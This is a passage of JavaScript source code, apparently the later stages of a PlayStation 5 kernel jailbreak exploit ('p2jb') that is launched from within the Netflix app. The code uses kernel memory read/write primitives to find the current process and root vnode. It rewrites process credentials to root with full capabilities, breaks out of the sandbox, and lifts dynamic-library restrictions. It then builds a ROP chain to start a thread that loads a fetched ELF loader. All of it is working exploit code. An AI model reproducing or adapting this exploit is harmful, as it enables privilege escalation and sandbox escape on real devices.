            logger.log("stage3_cleanup: sampling ucred");
            if (S.free_fd_idx < S.free_fds.length) {
                const sample_fd = S.free_fds[S.free_fd_idx];
                const sample_fp = S.kread64(S.fd_ofiles + BigInt(sample_fd) * S.OFF.FILEDESCENT_SIZE);
                if (sample_fp !== 0n && (sample_fp >> 48n) === 0xFFFFn) {
                    const fcred = S.kread64(sample_fp + 0x10n);
                    if (fcred !== 0n && (fcred >> 48n) === 0xFFFFn) {
                        S.ucred_A = fcred;
                    }
                }
            }

            logger.log("stage3_cleanup: nulling rthdrs (" + S.ipv6_sockets.length + " sockets)");
            for (const fd of S.ipv6_sockets) null_rthdr(fd);

            logger.log("stage3_cleanup: closing fds");
            for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
                syscall(SYSCALL.close, BigInt(S.free_fds[i]));
            }
            logger.log("stage3_cleanup: closing sockets");
            for (const fd of S.ipv6_sockets) syscall(SYSCALL.close, BigInt(fd));

            syscall(SYSCALL.close, BigInt(S.iov_sock_a));
            syscall(SYSCALL.close, BigInt(S.iov_sock_b));
            syscall(SYSCALL.close, BigInt(S.uio_sock_a));
            syscall(SYSCALL.close, BigInt(S.uio_sock_b));

            logger.log("stage3_cleanup: signaling workers");
            S.iov_ws.signal();
            S.uio_read_ws.signal();
            S.uio_write_ws.signal();
            syscall(SYSCALL.sched_yield);
            syscall(SYSCALL.sched_yield);

            logger.log("stage3_cleanup: resetting affinity/rtprio");
            for (let i = 0; i < 16; i++) write8_uncompressed(S.cpu_mask + BigInt(i), 0xffn);
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            write16_uncompressed(S.rt_params, 0n);
            write16_uncompressed(S.rt_params + 2n, 0n);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
            nanosleep_ms(30);

            logger.log("stage3_cleanup: workers signalled (D5, left parked)");

            nanosleep_ms(3000);

            {
                const [sr, sw] = create_pipe();
                const sigio_rfd = Number(sr), sigio_wfd = Number(sw);
                const our_pid = syscall(SYSCALL.getpid) & 0xFFFFFFFFn;
                const pid_buf = malloc(4);
                write32_uncompressed(pid_buf, our_pid);
                syscall(SYSCALL.ioctl, BigInt(sigio_rfd), 0x8004667Cn, pid_buf);

                const sigio_fp = S.kread64(S.fd_ofiles +
                    BigInt(sigio_rfd) * S.OFF.FILEDESCENT_SIZE);

                if (sigio_fp === 0n || (sigio_fp >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad sigio fp");

                const sigio_pipe = S.kread64(sigio_fp);

                if (sigio_pipe === 0n || (sigio_pipe >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad sigio pipe");

                const pipe_sigio = S.kread64(sigio_pipe + S.OFF.PIPE_SIGIO);

                if (pipe_sigio === 0n || (pipe_sigio >> 48n) !== 0xFFFFn)
                    fail("stage3b: no sigio");

                const curproc = S.kread64(pipe_sigio);

                if (curproc === 0n || (curproc >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad curproc");

                if (S.kread32(curproc + S.OFF.PROC_PID) !== our_pid)
                    fail("stage3b: pid mismatch");

                syscall(SYSCALL.close, BigInt(sigio_rfd));
                syscall(SYSCALL.close, BigInt(sigio_wfd));

                S.curproc = curproc;
                S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
                S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
                logger.log("stage3b: curproc=" + toHex(curproc) +
                    " fd=" + toHex(S.proc_fd));
            }

            logger.log("stage3b: race cleanup done");

            nanosleep_ms(3000);
        }

        function stage4(S) {
            send_notification("Stage 4\nFind rootvnode");

            if (!S.curproc || !S.proc_ucred || !S.proc_fd)
                fail("stage4: curproc/proc_ucred/proc_fd missing (should have " +
                    "been set in stage3_cleanup)");
            const curproc = S.curproc;
            logger.log("stage4: using curproc=" + toHex(curproc) +
                " from stage3_cleanup");

            let p = curproc, kernel_proc = null;
            for (let i = 0; i < 1000; i++) {
                if (p === 0n) break;
                if ((p >> 48n) !== 0xFFFFn) break;
                if (S.kread32(p + S.OFF.PROC_PID) === 0n) { kernel_proc = p; break; }
                p = S.kread64(p + 0n);
            }
            if (!kernel_proc) fail("stage4: kernel proc (pid=0) not found");

            const kernel_fd = S.kread64(kernel_proc + S.OFF.PROC_FD);
            if (kernel_fd === 0n || (kernel_fd >> 48n) !== 0xFFFFn)
                fail("stage4: kernel_fd bad: " + toHex(kernel_fd));

            const rootvnode = S.kread64(kernel_fd + S.OFF.FD_CDIR);
            if (rootvnode === 0n || (rootvnode >> 48n) !== 0xFFFFn)
                fail("stage4: rootvnode bad: " + toHex(rootvnode));

            S.rootvnode = rootvnode;
            logger.log("stage4: kernel_proc=" + toHex(kernel_proc) +
                " rootvnode=" + toHex(rootvnode));
        }


        function stage5(S) {
            send_notification("Stage 5\nJailbreak");

            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_NGROUPS, 1);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RGID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVGID, 0);

            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);

            let attrs = S.kread64(S.proc_ucred + 0x80n);
            attrs = (attrs & 0xFFFFFFFF00FFFFFFn) | (0x80n << 24n);
            S.kwrite64(S.proc_ucred + 0x80n, attrs);

            S.kwrite64(S.proc_fd + S.OFF.FD_RDIR, S.rootvnode);
            S.kwrite64(S.proc_fd + S.OFF.FD_JDIR, S.rootvnode);

            if (S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID) !== 0n) {
                fail("stage5: jailbreak verify failed");
            }
            logger.log("stage5: jailbreak ok");
        }

        function stage6(S) {
            send_notification("Stage 6\nData_base + Debug menu");

            const KDATA_MASK = 0xffff804000000000n;
            let p = S.curproc, allproc = 0n;
            for (let i = 0; i < 64; i++) {
                if (p !== 0n && (p & KDATA_MASK) === KDATA_MASK &&
                    ((p - S.OFF.DATA_BASE_ALLPROC) & 0xfffn) === 0n) {
                    allproc = p; break;
                }
                p = S.kread64(p + 8n);
            }
            if (allproc === 0n) {
                S.data_base_ok = false;
                logger.log("stage6: allproc not found - debug menu + elf " +
                    "loader skipped (jailbreak is done)");
                return;
            }
            const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
            S.data_base = data_base;
            logger.log("stage6: allproc=" + toHex(allproc) +
                " data_base=" + toHex(data_base));

            let data_base_ok = true;
            const first_proc = S.kread64(allproc);
            const first_proc_ok = (first_proc >> 48n) === 0xFFFFn;
            logger.log("stage6: data_base check - *allproc=" + toHex(first_proc) +
                (first_proc_ok ? "  (kptr OK)" : "  (BAD - not a kptr)"));
            if (!first_proc_ok) data_base_ok = false;

            if (typeof is_jailbroken === "function")
                logger.log("stage6: is_jailbroken() = " + is_jailbroken());
            S.data_base_ok = data_base_ok;
            if (!data_base_ok) {
                logger.log("stage6: data_base check FAILED - skipping the debug " +
                    "menu and the elf loader. The jailbreak is complete.");
                return;
            }
        }

       function stage7(S) {
            logger.log("Stage 7\nFinalize: dynlib restrictions");

            const is_kptr = (v) =>
                (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;

            const p_dynlib = S.kread64(S.curproc + 0x3E8n);

            if (!is_kptr(p_dynlib))
                throw new Error("p_dynlib not a kptr: " + toHex(p_dynlib));

            S.kwrite32(p_dynlib + 0x118n, 0);
            S.kwrite64(p_dynlib + 0x18n, 1n);

            S.kwrite64(p_dynlib + 0xF0n, 0n);
            S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);

            const dynlib_eboot = S.kread64(p_dynlib + 0x00n);

            if (!is_kptr(dynlib_eboot))
                throw new Error("dynlib_eboot not a kptr: " + toHex(dynlib_eboot));

            const eboot_segments = S.kread64(dynlib_eboot + 0x40n);

            if (!is_kptr(eboot_segments))
                throw new Error("eboot_segments not a kptr: " + toHex(eboot_segments));

            S.kwrite64(eboot_segments + 0x08n, 0n);
            S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
            logger.log("stage7: dynlib patched " +
                "(syscalls + dlsym unrestricted, dynlib=" +
                toHex(p_dynlib) + ")");

            logger.log("stage7: dynlib maximized; jailbreak fully finalized");
            send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");
        }

        function post_jb_migrate_ucred(S) {
            // post-jb KP fixes (ported from new p2jb)
            try {
                const B = S.proc_ucred;
                if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                    logger.log("post-jb migrate: B invalid, skip");
                } else {

                    const nfiles = Number(S.kread32(S.fd_ofiles - S.OFF.FDESCENTTBL_HDR) & 0xFFFFFFFFn);
                    let fd_migrated = 0;
                    const migrated_creds = new Set();
                    if (nfiles > 0 && nfiles <= 0x10000) {
                        for (let i = 0; i < nfiles; i++) {
                            const fp = S.kread64(S.fd_ofiles + BigInt(i) * S.OFF.FILEDESCENT_SIZE);
                            if (fp === 0n || (fp >> 48n) !== 0xFFFFn) continue;
                            const fcred = S.kread64(fp + 0x10n);
                            if (fcred === B) continue;
                            if ((fcred >> 48n) !== 0xFFFFn) continue;
                            S.kwrite64(fp + 0x10n, B);
                            migrated_creds.add(toHex(fcred));
                            fd_migrated++;
                        }
                    }
                logger.log("post-jb migrate: " + fd_migrated + " fds f_cred -> B " +
                    "(" + migrated_creds.size + " distinct cred kptrs replaced)");

                    const TD_UCRED_OFF = 0x140n;
                    let td_migrated = 0;
                    const migrated_tcreds = new Set();
                    const main_thread = S.kread64(S.curproc + 0x10n);
                    if (main_thread !== 0n && (main_thread >> 48n) === 0xFFFFn) {
                        let td = main_thread, walked = 0;
                        while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
                            walked++;
                            if (S.kread64(td + 0x08n) !== S.curproc) {
                                logger.log("post-jb migrate: td_proc mismatch, abort thread walk");
                                break;
                            }
                            const tu = S.kread64(td + TD_UCRED_OFF);
                            if (tu !== B && (tu >> 48n) === 0xFFFFn) {
                                S.kwrite64(td + TD_UCRED_OFF, B);
                                migrated_tcreds.add(toHex(tu));
                                td_migrated++;
                            }
                            td = S.kread64(td + 0x10n);
                        }
                    }
                    logger.log("post-jb migrate: " + td_migrated + " threads td_ucred -> B (" +
                        migrated_tcreds.size + " distinct cred kptrs replaced)");

                    const total = fd_migrated + td_migrated;
                    if (total > 0) {
                        const rc_old = Number(S.kread32(B) & 0xFFFFFFFFn);
                        S.kwrite32(B, rc_old + total);
                    logger.log("post-jb migrate: cr_ref(B) " +
                        ("0x" + rc_old.toString(16)) + " -> " +
                        ("0x" + (rc_old + total).toString(16)) +
                        " (+" + total + ")");
                    } else {
                        logger.log("post-jb migrate: nothing to migrate (all already on B)");
                    }
                }
            } catch (e) {
                logger.log("post-jb migrate: failed: " + e.message +
                    " (jailbreak unaffected, close-KP may still fire)");
            }

            try {
                const A = S.ucred_A || 0n;
                const B = S.proc_ucred;
                if (A === 0n || (A >> 48n) !== 0xFFFFn) {
                    logger.log("post-jb pin: A invalid (" + toHex(A) + "), skip");
                } else if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                    logger.log("post-jb pin: B invalid (" + toHex(B) + "), skip");
                } else if (A === B) {
                    logger.log("post-jb pin: A == B (unexpected), skip");
                } else {
                    const PIN_REFS = 0x10000000;
                    const buf = malloc(UCRED_SIZE);
                    S.kread(buf, B, UCRED_SIZE);
                    const old_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
                    write32_uncompressed(buf, BigInt(PIN_REFS));
                    S.kwrite(A, buf, UCRED_SIZE);
                    const new_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
                    if (Number(new_A_ref) === PIN_REFS) {
                        logger.log("post-jb pin: A=" + toHex(A) +
                        " overwritten with B-clone, cr_ref " +
                        toHex(old_A_ref) + " -> 0x" + PIN_REFS.toString(16) +
                            " (stale freelist consumers now see safe ucred)");
                    } else {
                        logger.log("post-jb pin: VERIFY FAILED, cr_ref(A)=" +
                        toHex(new_A_ref) + " (expected 0x" +
                        PIN_REFS.toString(16) + ")");
                    }
                }
            } catch (e) {
                logger.log("post-jb pin: failed: " + e.message +
                    " (jailbreak unaffected, close-KP may still fire)");
            }
        }

        function stage_elfldr_via_kexp(S) {
            // Load and run kexp via thr_new syscall instead of pthread_create (crashes on FW 10.x)
            // "borrow" TLS of the calling thread to allow malloc/free to work
            logger.log("stage_elfldr_via_kexp");

            allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;

            var kexp_file_name = "kexp_no_pthreads.bin";
            var kexp_data = malloc(32 * 1024);
            var kexp_size = fetch_file(kexp_file_name, kexp_data, 32 * 1024);
            logger.log("stage_elfldr_via_kexp: loaded " + kexp_file_name + " size=" + kexp_size + " bytes");

            if (kexp_size < 1000) throw new Error("stage_elfldr_via_kexp: failed to load " + kexp_file_name);

            var kexp_aligned = (BigInt(kexp_size) + 0x3FFFn) & ~0x3FFFn;
            var kexp_shmfd = syscall(SYSCALL.jitshm_create, 0n, kexp_aligned, 0x7n);
            var kexp_entry = syscall(SYSCALL.mmap, 0n, kexp_aligned, 0x7n, 0x1n, kexp_shmfd, 0n);

            for (var i = 0n; i < BigInt(kexp_size); i++)
                write8_uncompressed(kexp_entry + i, read8_uncompressed(kexp_data + i));

            var kexp_args = malloc(0x30);
            var kexp_flag = malloc(8);
            var kexp_tid = malloc(8);

            // ROP gadgets
            var kexp_setjmp = read64_uncompressed(eboot_base + 0x241f5f0n);
            var kexp_longjmp = read64_uncompressed(eboot_base + 0x241f5f8n);
            var kexp_tmp_jb = malloc(0x60);
            call(kexp_setjmp, kexp_tmp_jb, 0n);
            var kexp_fpu = read32_uncompressed(kexp_tmp_jb + 0x40n);
            var kexp_mxcsr = read32_uncompressed(kexp_tmp_jb + 0x44n);

            var kexp_RET = eboot_base + 0x42n;
            var kexp_POP_RDI = eboot_base + 0x1a729bn;
            var kexp_POP_RAX = eboot_base + 0x6c233n;
            var kexp_MOV_RDI_RAX = eboot_base + 0x1dcba9n;

            // Stack + chain buffer (mmap'd for large size)
            var STACK_SIZE = 0x80000 + 0x200 * 8;
            var kexp_stack = syscall(SYSCALL.mmap, 0n, BigInt(STACK_SIZE), 0x3n, 0x1002n, 0xFFFFFFFFn, 0n);
            logger.log("stack mmap @ " + hex(kexp_stack));
            var kexp_chain = kexp_stack + 0x80000n;

            // Scratch + jmpbuf
            var kexp_scratch = malloc(0x100);
            var kexp_jb = malloc(0x60);

            // thr_param
            var kexp_thr_param = malloc(0x68);

            logger.log("kexp state initialized");

            const ELFLDR_NAME = "elfldr-ps5.elf";

            var elfldr_buf  = malloc(400 * 1024);
            var elfldr_size = fetch_file(ELFLDR_NAME, elfldr_buf, 400 * 1024);
            if (!elfldr_size || elfldr_size < 1000) {
                logger.log("fetch elfldr: proxy fetch failed for " + ELFLDR_NAME + " (got " + elfldr_size + " bytes)");
                throw new Error("fetch elfldr: proxy fetch failed for " + ELFLDR_NAME);
            }
            logger.log("stage_elfldr: elfldr fetched " + elfldr_size + " bytes");

            write32_uncompressed(kexp_args + 0x00n, BigInt(S.master_rfd));
            write32_uncompressed(kexp_args + 0x04n, BigInt(S.master_wfd));
            write32_uncompressed(kexp_args + 0x08n, BigInt(S.victim_rfd));
            write32_uncompressed(kexp_args + 0x0Cn, BigInt(S.victim_wfd));
            write64_uncompressed(kexp_args + 0x10n, allproc);
            write64_uncompressed(kexp_args + 0x18n, elfldr_buf);
            write64_uncompressed(kexp_args + 0x20n, BigInt(elfldr_size));
            logger.log("kexp args: pipes=[" + S.master_rfd + "," + S.master_wfd +
                "," + S.victim_rfd + "," + S.victim_wfd +
                "] allproc=" + hex(allproc) + " elfldr=" + hex(elfldr_buf) + " size=" + elfldr_size);

            write64_uncompressed(kexp_flag, 0n);

            // Zero stack padding
            for (var k = 0n; k < 0x80000n; k += 8n) write64_uncompressed(kexp_stack + k, 0n);

            // Build ROP chain
            var ci = 0n;
            write64_uncompressed(kexp_chain + ci, kexp_RET); ci += 8n;
            write64_uncompressed(kexp_chain + ci, kexp_RET); ci += 8n;
            write64_uncompressed(kexp_chain + ci, kexp_POP_RDI); ci += 8n;
            write64_uncompressed(kexp_chain + ci, kexp_args); ci += 8n;
            write64_uncompressed(kexp_chain + ci, kexp_entry); ci += 8n;
            write64_uncompressed(kexp_chain + ci, kexp_POP_RDI); ci += 8n;
            write64_uncompressed(kexp_chain + ci, kexp_flag); ci += 8n;
            write64_uncompressed(kexp_chain + ci, kexp_MOV_RDI_RAX); ci += 8n;
            write64_uncompressed(kexp_chain + ci, kexp_POP_RAX); ci += 8n;
            write64_uncompressed(kexp_chain + ci, SYSCALL.thr_exit); ci += 8n;
            write64_uncompressed(kexp_chain + ci, kexp_POP_RDI); ci += 8n;
            write64_uncompressed(kexp_chain + ci, 0n); ci += 8n;
            write64_uncompressed(kexp_chain + ci, syscall_wrapper); ci += 8n;

            // Build jmpbuf
            for (var si = 0; si < 0x100; si += 8) write64_uncompressed(kexp_scratch + BigInt(si), 0n);
            for (var ji = 0; ji < 0x60; ji += 8) write64_uncompressed(kexp_jb + BigInt(ji), kexp_scratch);
            write64_uncompressed(kexp_jb, kexp_RET);
            write64_uncompressed(kexp_jb + 0x10n, kexp_chain);
            write32_uncompressed(kexp_jb + 0x40n, BigInt(kexp_fpu));
            write32_uncompressed(kexp_jb + 0x44n, BigInt(kexp_mxcsr));

            // Read main thread's fs_base to share with kexp thread
            var kexp_fsbase_ptr = malloc(8);
            write64_uncompressed(kexp_fsbase_ptr, 0n);
            syscall(0xA5n, 128n, kexp_fsbase_ptr);
            var kexp_fsbase = read64_uncompressed(kexp_fsbase_ptr);
            logger.log("stage_elfldr_via_kexp: main thread fs_base=" + hex(kexp_fsbase));

            // Build thr_param
            for (var ti = 0n; ti < 0x68n; ti += 8n) write64_uncompressed(kexp_thr_param + ti, 0n);
            write64_uncompressed(kexp_thr_param + 0x00n, kexp_longjmp);
            write64_uncompressed(kexp_thr_param + 0x08n, kexp_jb);
            write64_uncompressed(kexp_thr_param + 0x10n, kexp_stack);
            write64_uncompressed(kexp_thr_param + 0x18n, BigInt(0x80000 + 0x200 * 8));
            write64_uncompressed(kexp_thr_param + 0x20n, kexp_fsbase);  // tls_base
            write64_uncompressed(kexp_thr_param + 0x28n, 0x1000n);      // tls_size
            write64_uncompressed(kexp_tid, 0n);
            write64_uncompressed(kexp_thr_param + 0x30n, kexp_tid);    // child_tid
            write64_uncompressed(kexp_thr_param + 0x38n, kexp_tid);    // parent_tid

            var thr_ret = syscall(SYSCALL.thr_new, kexp_thr_param, 0x68n);
            logger.log("stage_elfldr_via_kexp: thr_new ret=" + hex(thr_ret));

            nanosleep_ms(500);

            var tid = read64_uncompressed(kexp_tid);
            var ret = read64_uncompressed(kexp_flag);
            logger.log("tid=" + hex(tid) + " flag=" + hex(ret));

            logger.log("stage_elfldr_via_kexp: complete");
        }

        function post_jb_null_master_pipe(S) {
            try {
                const buf_before = S.kread64(S.master_pipe_data + 0x10n);
                S.kwrite64(S.master_pipe_data + 0x10n, 0n);
                logger.log("post-jb: master.pipe_buffer.buffer NULL'd " +
                    "(was " + toHex(buf_before) + " = victim_pipe_data, " +
                        "kernel free-path will now skip vm_map_remove)");
            } catch (e) {
                logger.log("post-jb: pipe_buffer restore failed: " + e.message +
                    " (jailbreak unaffected)");
            }
        }

        function post_jb_kill_self(S) {
            logger.log("killing Netflix app, bye now...");
            send_notification("killing Netflix app, bye now...");
            nanosleep_ms(500);
            const pid = syscall(SYSCALL.getpid);
            syscall(SYSCALL.kill, pid, 9n);
        }

        send_notification(p2jb_version);

        try {
            if (typeof is_jailbroken === "function" && is_jailbroken()) {
                send_notification("p2jb: already jailbroken");
                return;
            }

            failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
            if (file_exists(failcheck_path)) {
                logger.log("aborting, failcheck path exists: " + failcheck_path);
                return;
            }
            write_file(failcheck_path, "");
        } catch (_) { failcheck_path = null; }

        logger.log(p2jb_version +" FW: " + FW_VERSION);

        ensure_kernel_offset();

        my_init_threading();

        setup_cpu_masks(S);
        setup_worker_sockets(S);
        setup_iov_buffers(S);
        setup_uio_buffers(S);
        setup_pipes_kernrw(S);

        logger.log("pipes master=" + S.master_rfd + "," + S.master_wfd +
            " victim=" + S.victim_rfd + "," + S.victim_wfd);
        logger.log("spawning workers");
        setup_workers(S);
        setup_ipv6_spray(S);

        S.orig_main_core = get_current_core();
        logger.log("orig_main_core=" + S.orig_main_core);

        apply_main_thread_pinning(S);

        const leak_nw = LEAK_CORES.length;
        let eta_minutes;
        switch (leak_nw) {
            case 1: eta_minutes = 120; break;
            case 2: eta_minutes = 70; break;
            case 3: eta_minutes = 60; break;
            case 4: eta_minutes = 50; break;
            default: eta_minutes = Math.round(48 * 4 / leak_nw); break;
        }
        const eta_str =  eta_minutes + " min";
        logger.log("host OK - starting " + leak_nw + "-core leak, ETA to stage0 ~" + eta_str);
        send_notification("starting " + leak_nw + "-core leak, ETA to stage0 ~" + eta_str);

        prepare_fds(S);
        stage0(S);

        stage1(S);
        stage2(S);
        stage3(S);

        stage4(S);
        stage5(S);

        stage6(S);
        try { stage7(S); } catch (e) {
            logger.log("stage7: dynlib patch failed: " + e.message + " (jailbreak continues)");
            send_notification("Stage 7\ndynlib patch failed\n(jailbreak still complete)");
        }

        pin_to_core(S.orig_main_core);
        logger.log("restored main thread to core " + S.orig_main_core);

        post_jb_migrate_ucred(S);

        stage_elfldr_via_kexp(S);

        post_jb_null_master_pipe(S);

        logger.log("=== p2jb complete ===");
        send_notification("p2jb complete");

        post_jb_kill_self(S);
    } catch (e) {
        try { logger.log("p2jb FATAL: " + e.message); } catch (_) { }
        try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
    }
})();
